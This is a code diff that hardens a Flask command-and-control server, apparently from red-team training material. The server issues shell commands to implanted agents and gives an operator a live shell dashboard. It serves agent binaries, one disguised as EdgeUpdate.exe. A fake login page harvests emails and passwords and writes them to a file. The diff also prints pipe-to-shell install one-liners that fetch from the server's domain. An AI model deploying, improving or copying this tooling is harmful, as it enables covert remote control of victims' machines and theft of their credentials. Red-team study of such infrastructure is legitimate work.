@@ -1,8 +1,4 @@
 #!/usr/bin/env python3
-"""
-C2 Server - HTTPS command & control
-Skill 14: Red Team Ops
-"""
 import base64
 import sys
 import hashlib
@@ -11,6 +7,7 @@ import json
 import os
 import ssl
 import threading
+import time
 import uuid
 from datetime import datetime, timezone
 from flask import Flask, request, jsonify, Response
@@ -22,9 +19,39 @@ TASKS = {}
 RESULTS = {}
 TASK_COUNTER = 0
 LOCK = threading.Lock()
-RAW_KEY = os.urandom(32)
-KEY_B64 = base64.b64encode(RAW_KEY).decode()
+
+RAW_KEY = None
+KEY_B64 = None
 DASH_TOKEN = base64.urlsafe_b64encode(os.urandom(16)).decode().rstrip("=")
+
+HONEYPOT_LOG = []
+HONEYPOT_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "honeypot.json")
+
+RATE_LIMIT_HITS = {}
+RATE_LIMIT_LOCK = threading.Lock()
+
+RATE_WINDOW = 60
+
+def _check_rate(limit=30):
+    now = time.time()
+    cutoff = now - RATE_WINDOW
+    with RATE_LIMIT_LOCK:
+        for k in list(RATE_LIMIT_HITS.keys()):
+            RATE_LIMIT_HITS[k] = [t for t in RATE_LIMIT_HITS[k] if t > cutoff]
+            if not RATE_LIMIT_HITS[k]:
+                del RATE_LIMIT_HITS[k]
+        ip = request.remote_addr or "unknown"
+        hits = RATE_LIMIT_HITS.setdefault(ip, [])
+        if len(hits) >= limit:
+            return True
+        hits.append(now)
+    return False
+
+@app.before_request
+def rate_limit():
+    limited = _check_rate(60)
+    if limited:
+        return jsonify({"error": "rate limited"}), 429
 
 def _expand(secret, iv, n):
     k = hmac.new(secret, iv, hashlib.sha256).digest()
@@ -33,28 +60,30 @@ def _expand(secret, iv, n):
         out += hmac.new(k, str(i).encode(), hashlib.sha256).digest()
     return out[:n]
 
-def encrypt(plain, key=RAW_KEY):
+def encrypt(plain, key=None):
+    k = key or RAW_KEY
+    if k is None:
+        raise ValueError("no encryption key set")
     iv = os.urandom(16)
     p = plain.encode() if isinstance(plain, str) else plain
-    ct = bytes(a ^ b for a, b in zip(p, _expand(key, iv, len(p))))
-    tag = hmac.new(key, iv + ct, hashlib.sha256).digest()[:8]
+    ct = bytes(a ^ b for a, b in zip(p, _expand(k, iv, len(p))))
+    tag = hmac.new(k, iv + ct, hashlib.sha256).digest()[:8]
     return base64.b64encode(iv + ct + tag).decode()
 
-def decrypt(data, key=RAW_KEY):
+def decrypt(data, key=None):
+    k = key or RAW_KEY
+    if k is None:
+        raise ValueError("no decryption key set")
     raw = base64.b64decode(data.encode())
     iv, ct, tag = raw[:16], raw[16:-8], raw[-8:]
-    expected = hmac.new(key, iv + ct, hashlib.sha256).digest()[:8]
+    expected = hmac.new(k, iv + ct, hashlib.sha256).digest()[:8]
     if not hmac.compare_digest(tag, expected):
         raise ValueError("bad tag")
-    p = bytes(a ^ b for a, b in zip(ct, _expand(key, iv, len(ct))))
+    p = bytes(a ^ b for a, b in zip(ct, _expand(k, iv, len(ct))))
     return p.decode()
 
 def gen_id():
     return str(uuid.uuid4())[:8]
-
-@app.route('/api/key', methods=['GET'])
-def get_key():
-    return jsonify({"key": KEY_B64})
 
 @app.route('/api/login', methods=['POST'])
 def agent_login():
@@ -62,9 +91,11 @@ def agent_login():
     raw = decrypt(data.get("cipher", ""))
     info = json.loads(raw)
     aid = gen_id()
+    token = base64.urlsafe_b64encode(os.urandom(16)).decode().rstrip("=")
     with LOCK:
         AGENTS[aid] = {
             "id": aid,
+            "token": token,
             "hostname": info.get("hostname", "?"),
             "user": info.get("user", "?"),
             "os": info.get("os", "?"),
@@ -75,7 +106,7 @@ def agent_login():
         }
         TASKS[aid] = []
         RESULTS[aid] = []
-    return jsonify({"agent_id": aid, "interval": 5})
+    return jsonify({"agent_id": aid, "token": token, "interval": 5})
 
 @app.route('/api/agents', methods=['GET'])
 def list_agents():
@@ -90,7 +121,7 @@ def list_agents():
                 a["alive"] = (now - last).total_seconds() < 30
             except Exception:
                 a["alive"] = False
-            out.append(a)
+            out.append({k: v for k, v in a.items() if k != "token"})
         return jsonify({"agents": out})
 
 @app.route('/api/tasks/<aid>', methods=['GET', 'POST'])
@@ -102,7 +133,7 @@ def handle_tasks(aid):
             tasks = TASKS.get(aid, [])
             out = tasks[:]
             TASKS[aid] = []
-        return jsonify({"tasks": out, "interval": 5, "key": KEY_B64, "known": aid in AGENTS})
+        return jsonify({"tasks": out, "interval": 5, "known": aid in AGENTS})
     else:
         data = request.get_json(force=True)
         raw = decrypt(data.get("cipher", ""))
@@ -110,8 +141,10 @@ def handle_tasks(aid):
         with LOCK:
             rlist = RESULTS.get(aid, [])
             rlist.append(result)
+            if len(rlist) > 1000:
+                rlist = rlist[-1000:]
             RESULTS[aid] = rlist
-        return jsonify({"ok": True, "key": KEY_B64})
+        return jsonify({"ok": True})
 
 @app.route('/api/task', methods=['POST'])
 def issue_task():
@@ -119,8 +152,12 @@ def issue_task():
     aid = data.get("agent_id", "")
     task_type = data.get("type", "shell")
     payload = data.get("payload", "")
+    if not aid or not task_type:
+        return jsonify({"error": "missing agent_id or type"}), 400
     with LOCK:
-        tid = len(TASKS.get(aid, [])) + 1
+        global TASK_COUNTER
+        TASK_COUNTER += 1
+        tid = TASK_COUNTER
         task = {"id": tid, "type": task_type, "payload": payload, "issued": datetime.now(timezone.utc).isoformat()}
         if aid in TASKS:
             TASKS[aid].append(task)
@@ -141,6 +178,18 @@ def get_results(aid):
     with LOCK:
         r = RESULTS.get(aid, [])
     return jsonify({"results": r})
+
+@app.route('/api/agent/<aid>/kill', methods=['POST'])
+def kill_agent_api(aid):
+    data = request.get_json(force=True) or {}
+    token = data.get("token", "")
+    with LOCK:
+        agent = AGENTS.get(aid)
+        if not agent:
+            return jsonify({"error": "unknown agent"}), 404
+        if agent.get("token") != token:
+            return jsonify({"error": "unauthorized"}), 403
+    return jsonify({"ok": True})
 
 DASHBOARD = r"""<!DOCTYPE html>
 <html lang="en">
@@ -180,7 +229,7 @@ tr:hover{background:#161b22}
 </style>
 </head>
 <body>
-<div id="top"><h1>&#9889; C2</h1><code id="kd"></code></div>
+<div id="top"><h1>&#9889; C2</h1></div>
 <table><thead><tr><th></th><th>ID</th><th>Host</th><th>User</th><th>OS</th><th>IP</th><th>Seen</th></tr></thead><tbody id="ab"></tbody></table>
 <div id="bar" class="hidden"><span class="l">Agent</span><span class="v" id="si"></span><span class="h">/</span><span class="v" id="sh"></span><span class="h">@</span><span class="v" id="su"></span><button class="k" onclick="ka()">KILL</button><button class="k" style="background:#d29922" onclick="kr()">RECONNECT</button></div>
 <div id="no">select agent</div>
@@ -210,9 +259,7 @@ async function sel(id){
   document.getElementById('prompt').textContent=a.user+'@'+a.hostname+' $ ';
   document.getElementById('input').value='';document.getElementById('input').focus();
   la();RC=0;SO=null;
-  // start PTY shell on agent
   ap('/api/task',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({agent_id:S,type:'shell_start',payload:''})});
-  // start output poller
   if(SO)clearInterval(SO);
   SO=setInterval(async()=>{
     let d=await ap('/api/results/'+S);
@@ -253,17 +300,12 @@ async function kr(){
   t.textContent+='\n[*] reconnect sent\n';
   t.scrollTop=t.scrollHeight;
 }
-(async()=>{let k=await ap('/api/key');document.getElementById('kd').textContent=k.key;la();setInterval(la,3000)})();
+(async()=>{la();setInterval(la,3000)})();
 </script>
 </body>
 </html>"""
 
-@app.route('/api/dash_token')
-def dash_token():
-    return jsonify({"token": DASH_TOKEN})
-
 PUBLIC_DOMAIN = "c2.trazento.site"
-HONEYPOT_LOG = []
 
 HONEYPOT_PAGE = r"""<!DOCTYPE html>
 <html lang="en">
@@ -304,9 +346,10 @@ def dashboard():
         if request.method == 'POST':
             email = request.form.get("email", "")
             pwd = request.form.get("password", "")
+            entry = {"email": email, "password": pwd, "ip": request.remote_addr, "time": datetime.now(timezone.utc).isoformat()}
             with LOCK:
-                HONEYPOT_LOG.append({"email": email, "password": pwd, "ip": request.remote_addr, "time": datetime.now(timezone.utc).isoformat()})
-            print(f"[HONEYPOT] {email}:{pwd} from {request.remote_addr}")
+                HONEYPOT_LOG.append(entry)
+                _append_honeypot_file(entry)
             return Response(HONEYPOT_PAGE.replace('display:none', 'display:block'), mimetype='text/html')
         return Response(HONEYPOT_PAGE, mimetype='text/html')
     tok = request.args.get("token", request.cookies.get("token", ""))
@@ -324,7 +367,18 @@ def dashboard():
     resp.set_cookie("token", DASH_TOKEN, max_age=86400)
     return resp
 
-# ─── install scripts ─────────────────────────────────────────────────
+def _append_honeypot_file(entry):
+    try:
+        entries = []
+        if os.path.exists(HONEYPOT_FILE):
+            with open(HONEYPOT_FILE, "r") as f:
+                entries = json.load(f)
+        entries.append(entry)
+        with open(HONEYPOT_FILE, "w") as f:
+            json.dump(entries, f, indent=2)
+    except Exception:
+        pass
+
 INSTALL_SH = r"""#!/bin/sh
 set -e
 AGENT="/var/tmp/.c2_agent"
@@ -380,24 +434,50 @@ def serve_install_ps1():
 @app.route('/agent/linux/<arch>')
 def serve_agent_linux(arch):
     path = os.path.join(BIN_DIR, "c2_agent")
+    if arch not in ("x86_64", "aarch64"):
+        return jsonify({"error": "unsupported arch"}), 400
     if not os.path.exists(path):
         return jsonify({"error": "agent binary not found"}), 404
-    return Response(open(path, 'rb').read(), mimetype='application/octet-stream')
+    with open(path, 'rb') as f:
+        return Response(f.read(), mimetype='application/octet-stream')
 
 @app.route('/agent/windows/<arch>')
 def serve_agent_windows(arch):
     path = os.path.join(BIN_DIR, "EdgeUpdate.exe")
+    if arch != "x86_64":
+        return jsonify({"error": "unsupported arch"}), 400
     if not os.path.exists(path):
         return jsonify({"error": "agent binary not found"}), 404
-    return Response(open(path, 'rb').read(), mimetype='application/octet-stream')
+    with open(path, 'rb') as f:
+        return Response(f.read(), mimetype='application/octet-stream')
 
 if __name__ == '__main__':
-    import sys
     use_tls = "--no-tls" not in sys.argv
+    raw_key_input = None
+    i = 1
+    while i < len(sys.argv):
+        a = sys.argv[i]
+        if a == "--key" and i + 1 < len(sys.argv):
+            raw_key_input = sys.argv[i + 1]
+            i += 2
+        elif a == "--no-tls":
+            i += 1
+        else:
+            i += 1
+
+    if raw_key_input:
+        RAW_KEY = base64.b64decode(raw_key_input.encode())
+    else:
+        RAW_KEY = os.urandom(32)
+        key_env = os.environ.get("C2_KEY", "")
+        if key_env:
+            RAW_KEY = base64.b64decode(key_env.encode())
+
+    KEY_B64 = base64.b64encode(RAW_KEY).decode()
     proto = "https" if use_tls else "http"
     print(f"[C2] Server key: {KEY_B64}")
     print(f"[C2] Dashboard token: {DASH_TOKEN}")
-    print(f"[C2] Dashboard: http://127.0.0.1:8443/?token={DASH_TOKEN}")
+    print(f"[C2] Dashboard: {proto}://127.0.0.1:8443 (use token above)")
     print(f"[C2] Install (Linux): curl -sS https://c2.trazento.site/install.sh | sh")
     print(f"[C2] Install (Windows): iex (iwr https://c2.trazento.site/install.ps1)")
     print(f"[C2] Listening on {proto}://0.0.0.0:8443")
